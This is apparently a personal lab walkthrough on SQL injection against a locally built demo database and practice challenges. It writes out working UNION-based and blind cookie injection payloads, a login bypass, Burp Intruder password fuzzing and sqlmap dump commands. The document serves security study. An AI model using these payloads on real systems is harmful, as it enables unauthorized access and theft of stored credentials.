First of all we need to setup the db adding some data in it
```bash
sudo systemctl start mysql
sudo mysql
```

```sql 
CREATE DATABASE sqldemo;

use sqldemo;

CREATE TABLE users (
username varchar(255),
password varchar(255),
age int,
PRIMARY KEY(username)
);

insert into users(username,password,age) values ("jeremy", "letmein",30);

insert into users(username,password,age) values ("jessamy", "kittems",31);

```


# Injection 0x01 UNION BASED
We can see on injection one a search form:
- ![[Pasted image 20241223150809.png]]
At this point we can try to test with different payload and if we use:
```
jeremy' or 1=1#
```
- it will print all the database info of the current table
- ![[Pasted image 20241223150946.png]]

So the app is vulnerable to SQLi.

We can start to retrieve info from other tables.

First we need to understand how many columns the current query chooses:
```sql
jeremy' union select null#
```
- we can see that with  `union select null,null,null#` it works, so we have 3 columns

## Version of the db
Now we can see the version of the db using:
```sql
jeremy' union select null,null,version()#
```


## tables in the db
Now we need to extract the table names in the db:
```sql
jeremy' union select null,null, table_name from informational_schema.tables#
```
- ![[Pasted image 20241223152026.png]]


For the columns of the tables we can try:
```sql
jeremy' union select null,null, column_name from informational_schema.columns#
```
- ![[Pasted image 20241223151937.png]]

So we will try to figure out the passwords:
```sql
jeremy' union select null,null, password from injection0x01 #
```


==**To understand which type is a column we can play and use numbers or chars instead of null.**==
- ![[Pasted image 20241223152239.png]]


# Injection 0x02 BLIND 1

What we have to do here is to login as `jeremy:jeremy` to go far with the challenge.


At this point with burp we can see the post request and understand if it is possible to manipulate it to bypass the login with sql injection:
- ![[Pasted image 20250104152146.png]]
Here we added 
``` sql
jeremy' or 1=1#
```
- in URL encoding

But it gives invalid credentials:
- ![[Pasted image 20250104152304.png]]

So we try with double quote:
```sql
jeremy" or 1=1#
```

But nothing.

## Automate it with sqlmap

we copy the request in burp and we put it into a `.txt` file:
- ![[Pasted image 20250104152438.png]]

At this point we can run sqlmap:
```bash
sqlmap -r request.txt
```


Also in this case we don't get results.

So we move to other injectable items.

## injecting the session cookie
With the repeter we resend the `GET` request after the `POST` login request:
-  ![[Pasted image 20250104152731.png]]

We can see that if we modify it we obtain a different page without `Welcome` string.

So try injection in the session cookie:
```sql 
COOKIE_VALUE' or 1=1#
```
- ![[Pasted image 20250104153032.png]]

We cansee that we can bypass the login in this way and we have the sql injection.


This is a blind injection because it only changes the behavior of the application but doesn't give us any data from the db.


So in this case we can extract data from the db with `yes or no` responses.
We can try to ask if the first letter of the username is `a,b...` and if it is true we will see the result...

In this case what we can use?

## extracting data with blind sql injection

For example we can try to figure out the version of the db with this query:
```sql
COOKIE_VALUE' and substring((select version()), 1, 1)='8'#
```
- this checks if the first char of the version is 8
- we can see that it is 8 because we obtain a response that contains `Welcome`, so the query returns true
	- ![[Pasted image 20250104153608.png]]

Enumerating it we obtain `8.0.3`


At this point we can extract the password of `jessamy` using this blind sql injection.

### extracting password
```sql
COOKIE_VALUE' and substring((select password from injection0x02 where username='jessamy', 1, 1)='a'#
```

But we want to make it automatic so we will use the intruder in burp:
- choose as attack the sniper
- select the char we want to fuzz
	- ![[Pasted image 20250104153925.png]]
- In payloads we insert the list of chars to fuzz
	- ![[Pasted image 20250104154006.png]]
- we start the attack and we see that the first char is `z`
	- ![[Pasted image 20250104154115.png]]

==**The best thing to do is:**==
1. **==guess the length of the password==**
2. ==**use the sniper to add a payload also on the number (position of the char)**==
3. ==**perform an attack to extract directly the password**==



### inject cookie in sqlmap
In this case we need to copy the request in a file and use `--level=2` in sqlmap:
```bash
sqlmap -r request_cookie.txt --level=2
```
- ![[Pasted image 20250104154506.png]]


At this point we can run `--dump` to dump the database for us:
```bash
sqlmap -r request_cookie.txt --level=2 --dump
```
- ![[Pasted image 20250104154631.png]]

**==We can also specify the table to dump:==**
```bash
sqlmap -r request_cookie.txt --level=2 --dump -T TABLE_NAME
```
- ![[Pasted image 20250104154721.png]]


# Challenge 
Now we want to solve `injection 0x03`

![[Pasted image 20250104154940.png]]
- we want to inject the search parameter

If we test for:
```sql
x' or 1=1#
```
- we obtain results, we can see all the products.


So now we can start to extract info using a way to understand how many columns has the resulting query:
```sql
valid_name' union select null,null,null, table_name from information_schema.tables #
```
- ![[Pasted image 20250104155337.png]]
We can see that it shows all the tables name.

So we start to extract the data:
```sql 
valid_name' union select null,null,null, username from injection0x03_users #
```
- in general we need to enumerate the columns first

So we try with passwords:
```sql 
valid_name' union select null,null,null, password from injection0x03_users #
```

## solve it with sqlmap
We copy the `POST` search request and we pass it to sqlmap:
- ![[Pasted image 20250104155632.png]]

```bash
sqlmap -r request_challenge.txt -T injection0x03_users --dump
```